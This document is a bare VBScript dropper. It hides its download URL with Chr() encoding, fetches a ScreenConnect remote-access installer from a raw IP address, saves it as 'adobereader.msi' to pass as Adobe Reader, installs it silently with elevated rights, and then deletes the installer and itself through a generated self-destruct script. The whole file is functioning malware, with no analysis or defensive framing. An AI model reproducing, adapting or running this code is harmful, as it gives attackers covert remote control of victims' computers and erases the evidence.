

On Error Resume Next

Dim oWS, oFSO, sURL, sFolder, sFile, sOut, oHTTP, oStream, oShellApp
Set oWS = CreateObject("WScript.Shell")
Set oFSO = CreateObject("Scripting.FileSystemObject")

' --- Obfuscated MSI URL (Chr() encoded) ---
sURL = Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(58) & Chr(47) & Chr(47) & _
       Chr(49) & Chr(57) & Chr(56) & Chr(46) & Chr(50) & Chr(51) & Chr(46) & Chr(49) & _
       Chr(56) & Chr(53) & Chr(46) & Chr(49) & Chr(49) & Chr(52) & Chr(47) & Chr(66) & _
       Chr(105) & Chr(110) & Chr(47) & Chr(83) & Chr(99) & Chr(114) & Chr(101) & Chr(101) & _
       Chr(110) & Chr(67) & Chr(111) & Chr(110) & Chr(110) & Chr(101) & Chr(99) & Chr(116) & _
       Chr(46) & Chr(67) & Chr(108) & Chr(105) & Chr(101) & Chr(110) & Chr(116) & Chr(83) & _
       Chr(101) & Chr(116) & Chr(117) & Chr(112) & Chr(46) & Chr(109) & Chr(115) & Chr(105)

' --- Add URL parameters (?e=Access&y=Guest) ---
sURL = sURL & Chr(63) & Chr(101) & Chr(61) & Chr(65) & Chr(99) & Chr(99) & Chr(101) & Chr(115) & Chr(115) & _
       Chr(38) & Chr(121) & Chr(61) & Chr(71) & Chr(117) & Chr(101) & Chr(115) & Chr(116)

sFolder = oWS.ExpandEnvironmentStrings("%USERPROFILE%\Downloads")
sFile = "adobereader.msi"
sOut = sFolder & "\" & sFile

If Not oFSO.FolderExists(sFolder) Then
    oFSO.CreateFolder(sFolder)
End If

' --- Download MSI ---
Set oHTTP = CreateObject("MSXML2.XMLHTTP")
oHTTP.Open "GET", sURL, False
oHTTP.Send

If oHTTP.Status = 200 Then
    Set oStream = CreateObject("ADODB.Stream")
    oStream.Type = 1
    oStream.Open
    oStream.Write oHTTP.ResponseBody
    oStream.Position = 0
    oStream.SaveToFile sOut, 2
    oStream.Close

    ' --- Install silently (UAC prompt will appear) ---
    Set oShellApp = CreateObject("Shell.Application")
    oShellApp.ShellExecute "msiexec.exe", "/i " & Chr(34) & sOut & Chr(34) & " /qn /norestart", "", "runas", 0

    ' --- Wait for installation to start ---
    WScript.Sleep 5000

    ' --- Wait for msiexec to finish ---
    Dim oWMI, col, found
    Set oWMI = GetObject("winmgmts:\\.\root\cimv2")
    found = False
    Dim i : i = 0
    Do While i < 60
        Set col = oWMI.ExecQuery("Select * from Win32_Process Where Name='msiexec.exe'")
        If col.Count > 0 Then
            found = True
            Exit Do
        End If
        WScript.Sleep 1000
        i = i + 1
    Loop

    If found Then
        Do
            Set col = oWMI.ExecQuery("Select * from Win32_Process Where Name='msiexec.exe'")
            If col.Count = 0 Then Exit Do
            WScript.Sleep 1000
        Loop
    End If

    ' --- Delete MSI ---
    On Error Resume Next
    oFSO.DeleteFile sOut, True
    On Error GoTo 0

    ' --- Self-destruct ---
    Dim sDel : sDel = sFolder & "\delete_me.vbs"
    Dim oDel : Set oDel = oFSO.CreateTextFile(sDel, True)
    oDel.WriteLine "On Error Resume Next"
    oDel.WriteLine "Dim oFSO : Set oFSO = CreateObject(""Scripting.FileSystemObject"")"
    oDel.WriteLine "WScript.Sleep 3000"
    oDel.WriteLine "oFSO.DeleteFile " & Chr(34) & WScript.ScriptFullName & Chr(34) & ", True"
    oDel.WriteLine "oFSO.DeleteFile " & Chr(34) & sDel & Chr(34) & ", True"
    oDel.Close

    oWS.Run Chr(34) & sDel & Chr(34), 0, False
    WScript.Quit
End If